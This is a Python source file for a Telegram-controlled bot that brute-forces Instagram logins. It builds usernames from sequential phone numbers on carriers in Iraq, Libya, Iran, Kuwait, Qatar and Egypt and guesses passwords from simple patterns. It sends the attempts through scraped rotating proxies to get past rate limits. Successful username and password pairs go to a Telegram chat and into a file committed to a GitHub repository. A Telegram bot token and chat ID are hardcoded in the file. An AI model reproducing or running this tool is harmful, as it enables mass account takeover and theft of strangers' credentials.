# ==============================================================================
#  THE BODY - AI Hunter Bot (Version with Learning Capability)
# ==============================================================================
import os
import requests
import random
import time
import threading
import json
from flask import Flask
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from github import Github, InputGitFile

# --- إعدادات أساسية ---
TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U"
CHAT_ID = "1148797883"
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
REPO_NAME = "chhzffu-del/MAHDI123"

# --- متغيرات الحالة العامة ---
is_running = False
active_threads = 0
hits = 0
fails = 0
last_event = "Tool is idle."
start_time = None
current_target = "None"
proxy_inventory = []
password_genes = []
red_zones = []
filter_stats = {"checked": 0, "total": 0}
all_proxies_master_list = []
proxy_sources = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt"
]
network_map = {
    '1': ("🇮🇶", "Asia (Iraq)", "964", "077"), '2': ("🇮🇶", "Zain (Iraq)", "964", "078"),
    '3': ("🇱🇾", "Libyana (Libya)", "218", "092"), '4': ("🇱🇾", "Almadar (Libya)", "218", "091"),
    '5': ("🇮🇷", "MCI (Iran)", "98", "91"), '6': ("🇰🇼", "Zain (Kuwait)", "965", "9"),
    '7': ("🇶🇦", "Ooredoo (Qatar)", "974", "5"), '8': ("🇪🇬", "Vodafone (Egypt)", "20", "010")
}
sequence_counters = {key: 0 for key in network_map}

# --- إعدادات Flask لخادم الويب ---
app = Flask(__name__)
@app.route('/')
def home():
    return "I'm alive and hunting!"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

# --- دوال GitHub ---
def get_github_repo():
    if not GITHUB_TOKEN:
        return None
    try:
        g = Github(GITHUB_TOKEN)
        repo = g.get_repo(REPO_NAME)
        return repo
    except Exception:
        return None

def log_hit_to_github(password):
    global last_event
    repo = get_github_repo()
    if not repo:
        last_event = "GitHub token is missing or invalid."
        return

    file_path = "successful_passwords.txt"
    commit_message = f"🏆 New successful password: {password}"
    
    try:
        contents = repo.get_contents(file_path, ref=repo.default_branch)
        existing_content = contents.decoded_content.decode("utf-8")
        new_content = existing_content + "\n" + password
        repo.update_file(contents.path, commit_message, new_content, contents.sha, branch=repo.default_branch)
        last_event = f"Logged successful password to GitHub."
    except Exception:
        repo.create_file(file_path, commit_message, password, branch=repo.default_branch)
        last_event = f"Created password log file on GitHub."

# --- دوال الأداة الأساسية ---
def fetch_proxies():
    global all_proxies_master_list, last_event
    all_proxies_master_list.clear()
    temp_proxies = set()
    for url in proxy_sources:
        try:
            response = requests.get(url, timeout=15)
            if response.status_code == 200:
                temp_proxies.update(response.text.strip().split('\n'))
        except Exception:
            continue
    all_proxies_master_list = list(temp_proxies)
    last_event = f"Fetched {len(all_proxies_master_list)} unique proxies."
    return len(all_proxies_master_list) > 0

def check_proxy(proxy):
    try:
        requests.get("https://www.instagram.com", proxies={"http": proxy, "https": proxy}, timeout=7)
        return True
    except Exception:
        return False

def filter_worker():
    global filter_stats
    while all_proxies_master_list:
        proxy = all_proxies_master_list.pop(0)
        filter_stats["checked"] += 1
        if check_proxy(proxy):
            proxy_inventory.append(proxy)

def generate_password(username):
    if not password_genes:
        return username[-8:]
    gene = random.choice(password_genes)
    formats = [
        f"{gene}{username[-4:]}",
        f"{username[-4:]}{gene}",
        f"{gene}123",
        f"{gene}12345"
    ]
    return random.choice(formats)

def hunt_worker(network_key):
    global hits, fails, last_event, active_threads
    active_threads += 1
    while is_running:
        if not proxy_inventory:
            time.sleep(2)
            continue
        
        proxy = random.choice(proxy_inventory)
        
        try:
            country_code, prefix = network_map[network_key][2], network_map[network_key][3]
            sequence_counters[network_key] += 1
            number_part = str(10000000 + sequence_counters[network_key]).zfill(8)
            username = f"{country_code}{prefix}{number_part}"
            password = generate_password(username)

            url = 'https://www.instagram.com/accounts/login/ajax/'
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'}
            data = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}'}
            
            r = requests.post(url, headers=headers, data=data, proxies={"http": proxy, "https": proxy}, timeout=10)
            
            if 'userId' in r.text:
                hits += 1
                last_event = f"🎉 HIT! User: {username}"
                send_hit_message(username, password, network_key)
                log_hit_to_github(password) # تسجيل كلمة المرور الناجحة
            else:
                fails += 1
                last_event = f"Attempt failed for {username}"
        except Exception as e:
            fails += 1
            last_event = f"Proxy burned: {proxy}"
            if proxy in proxy_inventory:
                proxy_inventory.remove(proxy)
        time.sleep(1)
    active_threads -= 1

def main_logic(network_key):
    global is_running, start_time, current_target, hits, fails, last_event, filter_stats, password_genes, red_zones
    is_running = True
    start_time = time.time()
    current_target = network_map[network_key][1]
    hits, fails = 0, 0
    filter_stats = {"checked": 0, "total": 0}
    proxy_inventory.clear()

    if not fetch_proxies():
        last_event = "Could not fetch any proxies. Stopping."
        is_running = False
        return
    
    filter_stats["total"] = len(all_proxies_master_list)
    
    filter_threads = [threading.Thread(target=filter_worker) for _ in range(75)]
    for t in filter_threads: t.start()

    hunter_threads = [threading.Thread(target=hunt_worker, args=(network_key,)) for _ in range(25)]
    for t in hunter_threads: t.start()

    while is_running and any(t.is_alive() for t in filter_threads + hunter_threads):
        if not proxy_inventory and not all_proxies_master_list and not any(t.is_alive() for t in filter_threads):
            last_event = "All proxies exhausted. Refetching..."
            if not fetch_proxies():
                last_event = "Failed to refetch proxies. Stopping."
                is_running = False
                break
            filter_stats["total"] = len(all_proxies_master_list)
            filter_stats["checked"] = 0
            filter_threads = [threading.Thread(target=filter_worker) for _ in range(75)]
            for t in filter_threads: t.start()
        time.sleep(5)
    is_running = False

# --- دوال بوت التيليجرام ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running
    if is_running:
        await update.message.reply_text("⚠️ The tool is already running. Use /stop first.")
        return
    
    keyboard = [[KeyboardButton(f"{flag} {name}")] for _, (flag, name, _, _) in network_map.items()]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text('🤖 Welcome, Mahdi! Please choose a target to start hunting:', reply_markup=reply_markup)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running, last_event
    if not is_running:
        await update.message.reply_text("Tool is not running.")
        return
    is_running = False
    last_event = "🛑 Stop command received. Shutting down workers..."
    await update.message.reply_text("Shutting down... Please wait a moment for all threads to stop.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = "N/A"
    if start_time:
        uptime_seconds = int(time.time() - start_time)
        hours, remainder = divmod(uptime_seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        uptime = f"{hours:02}:{minutes:02}:{seconds:02}"

    speed = 0
    if start_time and (hits + fails) > 0:
        elapsed = time.time() - start_time
        speed = (hits + fails) / elapsed if elapsed > 0 else 0

    status_msg = (
        f"📊 *Tool Status* 📊\n"
        f"--------------------------------\n"
        f"🏃‍♂️ *State:* {'Running' if is_running else 'Idle'}\n"
        f"🎯 *Target:* {current_target}\n"
        f"⏳ *Uptime:* {uptime}\n"
        f"--------------------------------\n"
        f"🧠 *AI Genes:* {len(password_genes)} loaded\n"
        f"🔎 *Filtering:* {filter_stats['checked']}/{filter_stats['total']} ({filter_stats['checked']/filter_stats['total']:.1%} if filter_stats['total'] > 0 else '0.0%')\n"
        f"🔋 *Inventory:* {len(proxy_inventory)} proxies ready\n"
        f"🏹 *Hunters:* {active_threads} active\n"
        f"--------------------------------\n"
        f"✅ *Hits:* {hits}\n"
        f"❌ *Fails:* {fails}\n"
        f"⚡️ *Speed:* {speed:.1f} att/sec\n"
        f"--------------------------------\n"
        f"💬 *Last Event:* {last_event}"
    )
    await update.message.reply_text(status_msg, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running
    if is_running: return
    
    choice = update.message.text
    target_key = None
    for key, (flag, name, _, _) in network_map.items():
        if choice == f"{flag} {name}":
            target_key = key
            break
            
    if target_key:
        await update.message.reply_text(f"🚀 Starting hunt for {choice}. Use /status to check progress.")
        thread = threading.Thread(target=main_logic, args=(target_key,))
        thread.start()
    else:
        await update.message.reply_text("Invalid selection. Please use /start to see the options.")

def send_hit_message(username, password, network_type):
    network_name = network_map.get(network_type, ("","Unknown"))[1]
    message = (
        f"💎✨ *New Hit Found!* ✨💎\n\n"
        f"Congratulations, Al-Sayed Mahdi!\n\n"
        f"🌐 *Network:* {network_name}\n"
        f"👤 *Username:* `{username}`\n"
        f"🔑 *Password:* `{password}`\n\n"
        f"From your loyal hunting bot."
    )
    context.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode='Markdown')

# --- دالة التشغيل الرئيسية للبوت ---
def run_bot():
    global context
    application = Application.builder().token(TOKEN).build()
    context = application
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("Control Bot is up and running...")
    application.run_polling()

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask); flask_thread.daemon = True; flask_thread.start()
    run_bot()
